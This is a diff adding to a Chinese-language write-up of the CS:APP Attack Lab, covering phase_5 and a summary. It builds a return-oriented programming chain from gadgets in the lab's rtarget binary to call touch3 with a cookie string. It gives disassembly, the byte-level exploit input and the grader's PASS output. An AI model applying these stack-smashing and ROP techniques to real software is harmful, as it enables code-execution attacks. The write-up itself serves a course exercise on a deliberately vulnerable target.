@@ -14,6 +14,7 @@
     - [Return-Oriented Programming](#return-oriented-programming)
       - [phase\_4](#phase_4)
       - [phase\_5](#phase_5)
+  - [总结](#总结)
 
 
 ## 准备
@@ -530,3 +531,171 @@ PASS: Would have posted the following:
 
 #### phase_5
 
+参照 [PDF](http://csapp.cs.cmu.edu/3e/attacklab.pdf) 中 `5.2` 的部分
+
+本实验要求我们在 `rtarget` 中完成 `phase_3` 的内容
+
+我们知道，`phase_3` 的难点在于 `hexmatch` 会将缓冲区覆盖导致没办法正常读取到插入的字符串，因此我们考虑先改变栈指针 `%rsp` ，然后将 `%rdi` 的值指向我们插入字符串的起始地址出
+
+在这里，我们无法去改变 `%rsp` 的值，因为没有一个合适的 `gadget` 让我们这么做，因此我们考虑另一种做法：
+
+**在 `touch3` 跳转地址的上面插入该字符串**，那么我们只需要让 `%rdi` 的值指向该地址，那么就可以正常的读取到该字符串
+
+思路到这，也就到了本题的难点：栈是随机的，我们该如何定位 `touch3` 的前一个地址的位置
+
+由于每次程序运行时栈的地址都不同，我们确实无法直接通过地址赋值的方式给 `%rdi` 进行赋值，但我们注意到**我们需要的地址总是在 `touch3` 的前一个位置**，也就是说，如果我们能得到某个时刻 `%rsp` 的值，那么将其减去某个偏移量，自然便可以得到我们想要的地址
+
+在 `farm` 中，我们发现有一个计算两数之和的函数：
+
+```assembly
+00000000004019d6 <add_xy>:
+  4019d6:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax
+  4019da:	c3                   	ret    
+```
+
+我们考虑用这个函数来实现，此函数将 `%rdi` 和 `%rsi` 的值累加后放到 `%rax` 中
+
+我们查表可以发现，`mov %rax, %rdi` 和 `mov %rsp, %rax` 这两个操作在 `farm` 中总能够找到
+
+因此我们用 `%rdi` 来存储某时刻的栈指针（这一步很容易可以实现），用 `%rsi` 来存储偏移量
+
+我们用 `pop %rax` 来将偏移量临时存放在 `%rax` 中，之后的问题转为如何将偏移量赋值给 `%rsi`
+
+在 `farm` 中，**没有 `gadget` 能够直接将值赋值给 `%rsi`**，由于我们的偏移量不会太大，因此考虑看看有没有什么寄存器能够赋值给 `%esi` 
+
+查表得知，**能够给 `%esi` 赋值的只有 `%ecx`**，我们按着这个思路往回推，有哪个寄存器可以给 `%ecx` 赋值
+
+**能够给 `%rcx` 赋值的只有 `%edx`**，对应的 `gadget` 如下：
+
+```assembly
+0000000000401a6e <setval_167>:
+  401a6e:	c7 07 89 d1 91 c3    	movl   $0xc391d189,(%rdi)
+  401a74:	c3                   	ret    
+```
+
+我们需要的是 `89 d1` ，后面接了一个 `91` ，这个属于 `nop` ，效果于 `90` 一样
+
+> 我们可以在 `phase_2` 中试一下，将栈顶全部换成 `91`，得到如下输入
+> 
+> ```
+> 91 91 91 91 91 91 91 91
+> 48 c7 c7 fa 97 b9 59 68
+> ec 17 40 00 c3 00 00 00
+> 00 00 00 00 00 00 00 00
+> 00 00 00 00 00 00 00 00
+> 78 dc 61 55 00 00 00 00
+> ```
+> 
+> 这个输入也是可以通过的
+
+继续刚刚的过程，**能够赋值给 `%edx` 赋值的只有 `%eax`**，到此为止我们便实现了从 `%rax` 到 `%rsi` 的赋值
+
+我们将这个过程写成伪代码的形式，方便我们查找对应的 `gadget`：
+
+```assembly
+rsp -> rax
+rax -> rdi
+pop rax
+//偏移量x
+eax -> edx
+edx -> ecx
+ecx -> esi
+lea (rdi, rsi) -> rax
+rax -> rdi
+//touch3返回地址
+cookie字符串
+```
+
+最终答案为：
+
+```
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+06 1a 40 00 00 00 00 00
+a2 19 40 00 00 00 00 00
+ab 19 40 00 00 00 00 00
+48 00 00 00 00 00 00 00
+dd 19 40 00 00 00 00 00
+70 1a 40 00 00 00 00 00
+13 1a 40 00 00 00 00 00
+d6 19 40 00 00 00 00 00
+a2 19 40 00 00 00 00 00
+fa 18 40 00 00 00 00 00
+35 39 62 39 39 37 66 61
+```
+
+运行结果：
+
+```bash
+$ ./rtarget -qi ./answer/phase_5/output 
+Cookie: 0x59b997fa
+Touch3!: You called touch3("59b997fa")
+Valid solution for level 3 with target rtarget
+PASS: Would have posted the following:
+        user id bovik
+        course  15213-f15
+        lab     attacklab
+        result  1:PASS:0xffffffff:rtarget:3:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 06 1A 40 00 00 00 00 00 A2 19 40 00 00 00 00 00 AB 19 40 00 00 00 00 00 48 00 00 00 00 00 00 00 DD 19 40 00 00 00 00 00 70 1A 40 00 00 00 00 00 13 1A 40 00 00 00 00 00 D6 19 40 00 00 00 00 00 A2 19 40 00 00 00 00 00 FA 18 40 00 00 00 00 00 35 39 62 39 39 37 66 61 
+```
+
+## 总结
+
+我们最后写一个简单的脚本 `auto.sh` 来庆祝一下吧
+
+```bash
+#!/bin/bash
+./ctarget -qi ./answer/phase_1/output
+./ctarget -qi ./answer/phase_2/output
+./ctarget -qi ./answer/phase_3/output
+./rtarget -qi ./answer/phase_4/output
+./rtarget -qi ./answer/phase_5/output
+```
+
+运行结果：
+
+```bash
+$ ./auto.sh 
+Cookie: 0x59b997fa
+Touch1!: You called touch1()
+Valid solution for level 1 with target ctarget
+PASS: Would have posted the following:
+        user id bovik
+        course  15213-f15
+        lab     attacklab
+        result  1:PASS:0xffffffff:ctarget:1:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 C0 17 40 00 00 00 00 00 
+Cookie: 0x59b997fa
+Touch2!: You called touch2(0x59b997fa)
+Valid solution for level 2 with target ctarget
+PASS: Would have posted the following:
+        user id bovik
+        course  15213-f15
+        lab     attacklab
+        result  1:PASS:0xffffffff:ctarget:2:48 C7 C7 FA 97 B9 59 68 EC 17 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00 
+Cookie: 0x59b997fa
+Touch3!: You called touch3("59b997fa")
+Valid solution for level 3 with target ctarget
+PASS: Would have posted the following:
+        user id bovik
+        course  15213-f15
+        lab     attacklab
+        result  1:PASS:0xffffffff:ctarget:3:48 8D 24 25 78 DC 61 55 48 8D 3C 25 90 DC 61 55 68 FA 18 40 00 C3 00 00 35 39 62 39 39 37 66 61 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00 
+Cookie: 0x59b997fa
+Touch2!: You called touch2(0x59b997fa)
+Valid solution for level 2 with target rtarget
+PASS: Would have posted the following:
+        user id bovik
+        course  15213-f15
+        lab     attacklab
+        result  1:PASS:0xffffffff:rtarget:2:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 AB 19 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 C5 19 40 00 00 00 00 00 EC 17 40 00 00 00 00 00 
+Cookie: 0x59b997fa
+Touch3!: You called touch3("59b997fa")
+Valid solution for level 3 with target rtarget
+PASS: Would have posted the following:
+        user id bovik
+        course  15213-f15
+        lab     attacklab
+        result  1:PASS:0xffffffff:rtarget:3:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 06 1A 40 00 00 00 00 00 A2 19 40 00 00 00 00 00 AB 19 40 00 00 00 00 00 48 00 00 00 00 00 00 00 DD 19 40 00 00 00 00 00 70 1A 40 00 00 00 00 00 13 1A 40 00 00 00 00 00 D6 19 40 00 00 00 00 00 A2 19 40 00 00 00 00 00 FA 18 40 00 00 00 00 00 35 39 62 39 39 37 66 61 
+```
